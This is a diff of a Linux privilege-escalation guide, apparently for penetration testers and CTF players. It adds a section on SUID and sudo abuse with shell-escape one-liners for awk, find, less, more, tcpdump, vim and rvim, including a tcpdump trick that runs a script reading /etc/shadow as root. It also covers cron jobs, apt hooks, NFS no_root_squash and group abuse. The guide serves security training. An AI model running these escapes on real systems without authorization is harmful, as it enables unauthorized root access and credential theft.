@@ -6,16 +6,98 @@ When enumerating a Linux system, there are an absolute tonne of scripts which ca
 * [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
 * [Linux\_Exploit\_Suggester.pl](/Linux_Exploit_Suggester.pl)
 
-The first thing you should do is run one or more of these, save the output they give you and just read them.  Try to find any obvious things sticking out and don't rush to try kernel exploits even if you see them suggested here.  Kernel exploits, while effective, will frequently crash the system if they fail and the last thing you want on an engagement is to perform a denial-of-service or annoy your fellow CTF players.  
+The first thing you should do is run one or more of these, save the output they give you and just read them.  Try to find any obvious things sticking out and don't rush to try kernel exploits even if you see them suggested here.  Kernel exploits, while effective, will frequently crash the system if they fail and the last thing you want on an engagement is to perform a denial-of-service or annoy your fellow CTF players.
 
 It also can't hurt to double-check by going through the following guides:
 
 * [g0tmi1k - Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 * [RebootUser - Local Linux Enumeration & Privilege Escalation Cheatsheet](https://www.rebootuser.com/?p=1623)
 
-Put that c0w down and let's see how we can exploit the low hanging fruit.  
+Put that c0w down and let's see how we can exploit the low hanging fruit.
 
-### Cronjobs
+## SUID Applications and Sudo
+
+The holy grail of Linux Privilege Escalation.  This section will describe two attack vectors that are effectively the same, and that is of Linux applications running with excessive privileges.  These can either be via sudo or the SUID/GUID bit, but in effect it's about taking an application that is running as a privileged user and performing code execution.
+
+To find any SUID or GUID files run the following commands.  Some binaries are moving away from the concept of SUID and towards [capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html), as there's very little reason for many binaries to have full privileged execution:
+
+```
+#Find SUID
+find / -perm -u=s -type f 2>/dev/null
+
+#Find GUID
+find / -perm -g=s -type f 2>/dev/null
+```
+
+Also perform a check of any sudo commands you can run as a privileged user:
+
+```
+sudo -l
+```
+
+Check any binaries in the above lists, both what they do and the version number.  Many older applications have vulnerabilities that can lead to code execution so that is also worth reading up on.
+
+The following standard Unix tools have many easy ways to perform arbitrary code execution if you find yourself in a situation enabling you to execute them as a privileged user.
+
+##### awk {#awk}
+
+```
+awk 'BEGIN {system("/bin/bash")}'
+```
+
+##### find {#find}
+
+```
+find / -exec bash -i \;
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
+```
+
+##### less {#less}
+
+From less you can go into vi, and then into a shell.
+
+```
+less /etc/shadow
+v
+:shell
+```
+
+##### more {#more}
+
+You need to run more on a file that is bigger than your screen.
+
+```
+more /home/pelle/myfile
+!/bin/bash
+```
+
+##### tcpdump {#tcpdump}
+
+```
+echo $'id\ncat /etc/shadow' > /tmp/.test
+chmod +x /tmp/.test
+tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+##### vi/vim {#vivim}
+
+```
+:shell
+
+:set shell=/bin/bash:shell    
+:!bash
+```
+
+##### rvim {#rvim}
+
+```
+:diffpatch $(sh <&2 >&2) 
+
+:py import os
+:py os.system("/bin/bash")
+```
+
+## Cron Jobs
 
 Very simply, a cronjob is a task set on a timer, for example every 15 minutes or every 3rd day of the month.  These tasks offer a whole avenue for exploitation as they are often quickly coded and can introduce all sorts of vulnerabilities.
 
@@ -25,7 +107,7 @@ Viewing `/etc/crontab` is of course the classic.  The cron job format is in the 
 <minute> <hour> <day of month> <month> <day of week> <user> <command>
 ```
 
-Ideally we'll have a vulnerable command being run that we can then exploit.  The following files and commands are worth enumerating to see if anything's been misconfigured or the cron itself is visible publicly.
+Ideally we'll have a vulnerable command being run that we can then exploit.  The following files and commands are also worth enumerating to see if anything's been misconfigured and the cron itself is visible publicly.
 
 ```
 crontab -l
@@ -71,11 +153,11 @@ Take the hypothetical example of an `apt update` command being run on a schedule
 APT::Update::Post-Invoke {"id > /tmp/whoami";};
 ```
 
-**References        
-**[https://discourse.osmc.tv/t/run-script-after-update/5734/13**        
+**References                      
+**[https://discourse.osmc.tv/t/run-script-after-update/5734/13**                      
 **](https://discourse.osmc.tv/t/run-script-after-update/5734/13)[https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/)
 
-### NFS Shares
+## NFS Shares
 
 If you find that a machine has a NFS share you might be able to use that to escalate privileges.
 
@@ -120,7 +202,7 @@ You could also just generate a binary using msfvenom if desired, but this will r
 [NFS, no\_root\_squash and SUID - Basic NFS Security](http://fullyautolinux.blogspot.co.uk/2015/11/nfs-norootsquash-and-suid-basic-nfs.html)  
 [HackTheBox-Jail](https://reboare.github.io/htb/htb-jail.html#becoming-somebody)
 
-### Abusing Excessive Groups
+## Abusing Excessive Groups
 
 Often you'll find that a user has been made a member of a group that it needn't be a part of.  From this you can abuse this to either leak information or compromise the system in unintended ways.
 
@@ -211,4 +293,8 @@ height=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2)
 This isn't directly exploitable, but utilized correctly can allow you to view a user with physical access' session and potentially leak information this way.  On modern systems it's a slight pipe dream.
 
 [Alternative Script](ftp://ftp.embeddedarm.com/ts-arm-sbc/ts-7350-linux/samples/bmptoraw.c)
+
+### 
+
+
 
